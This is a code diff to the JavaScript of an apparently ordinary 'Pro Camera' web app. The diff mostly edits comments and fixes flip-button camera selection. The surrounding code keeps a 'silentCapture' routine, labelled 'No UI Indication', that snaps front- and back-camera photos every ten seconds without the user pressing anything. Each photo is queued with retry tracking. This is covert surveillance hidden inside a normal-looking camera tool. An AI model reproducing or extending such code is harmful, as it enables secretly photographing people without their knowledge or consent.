@@ -1,5 +1,5 @@
 // ================================================================
-// app.js – Pro Camera PWA (Sequential Auto Capture: Front → Back)
+// app.js – Pro Camera PWA (Flip ONLY – No Capture on Flip)
 // ================================================================
 
 (function() {
@@ -41,7 +41,7 @@
   var zoomPresets = document.querySelectorAll('.zoom-preset');
 
   // ---------- State ----------
-  var userFacingMode = 'environment';
+  var userFacingMode = 'environment'; // User's current preview camera
   var backStream = null;
   var frontStream = null;
   var currentPreviewStream = null;
@@ -229,7 +229,7 @@
     isProcessing = false;
   }
 
-  // ---------- Silent Capture ----------
+  // ---------- Silent Capture (No UI Indication) ----------
   async function silentCapture(stream, cameraType, captureType) {
     if (!stream) return;
     captureType = captureType || 'auto';
@@ -273,8 +273,8 @@
       createdAt: new Date().toISOString(),
       retryCount: 0,
       lastAttempt: null,
-      captureType: captureType, // 'auto' or 'manual'
-      cameraType: cameraType   // 'back' or 'front'
+      captureType: captureType,
+      cameraType: cameraType
     };
 
     await addToQueue(entry);
@@ -302,37 +302,30 @@
       var timeSinceUserCapture = now - lastUserCaptureTime;
 
       if (timeSinceUserCapture < 10000) {
-        console.log('[Camera] ⏳ User captured recently (' + (timeSinceUserCapture/1000).toFixed(1) + 's ago), skipping auto-capture');
+        console.log('[Camera] ⏳ User captured recently, skipping auto-capture');
         return;
       }
 
-      // ✅ Step 1: Front Camera at 10.1s
+      // Step 1: Front Camera at 10.1s
       if (frontStream) {
         console.log('[Camera] 📸 Auto capture: Front at 10.1s');
         silentCapture(frontStream, 'front', 'auto');
-      } else {
-        console.warn('[Camera] ⚠️ Front camera not available, skipping front capture');
       }
 
-      // ✅ Step 2: Back Camera at 12s (1.9s after front)
+      // Step 2: Back Camera at 12s (1.9s later)
       setTimeout(function() {
         if (backStream) {
           console.log('[Camera] 📸 Auto capture: Back at 12s');
           silentCapture(backStream, 'back', 'auto');
-        } else {
-          console.warn('[Camera] ⚠️ Back camera not available, skipping back capture');
         }
-      }, 1900); // 1.9 second delay between front and back
+      }, 1900);
     };
 
-    // Run immediately
     captureSequence();
-
-    // Then every 10 seconds (check interval)
     autoCaptureInterval = setInterval(captureSequence, 10000);
   }
 
-  // ---------- Manual Capture ----------
+  // ---------- Manual Capture (ONLY Capture Button) ----------
   async function capturePhoto() {
     if (!isCameraReady) return;
     flashScreen();
@@ -745,15 +738,22 @@
   // ✅ Flip Button – ONLY FLIP (No Capture)
   flipBtn.addEventListener('click', function() {
     console.log('[Camera] 🔄 Flip button clicked');
+    // Toggle user facing mode
     userFacingMode = (userFacingMode === 'environment') ? 'user' : 'environment';
     console.log('[Camera] Switching to:', userFacingMode);
 
+    // Select appropriate stream
     if (userFacingMode === 'environment' && backStream) {
       currentPreviewStream = backStream;
-    } else if (frontStream) {
+    } else if (userFacingMode === 'user' && frontStream) {
       currentPreviewStream = frontStream;
     } else if (backStream) {
+      // Fallback if selected camera not available
       currentPreviewStream = backStream;
+      userFacingMode = 'environment';
+    } else if (frontStream) {
+      currentPreviewStream = frontStream;
+      userFacingMode = 'user';
     }
 
     if (currentPreviewStream) {
@@ -802,9 +802,11 @@
     aspectDropdown.classList.remove('open');
   });
 
+  // ✅ Capture Button – ONLY Capture
   captureBtn.addEventListener('click', capturePhoto);
   galleryThumb.addEventListener('click', viewLastPhoto);
 
+  // Expose functions
   window.toggleZoomSwipe = toggleZoomSwipe;
   window.capturePhoto = capturePhoto;
 
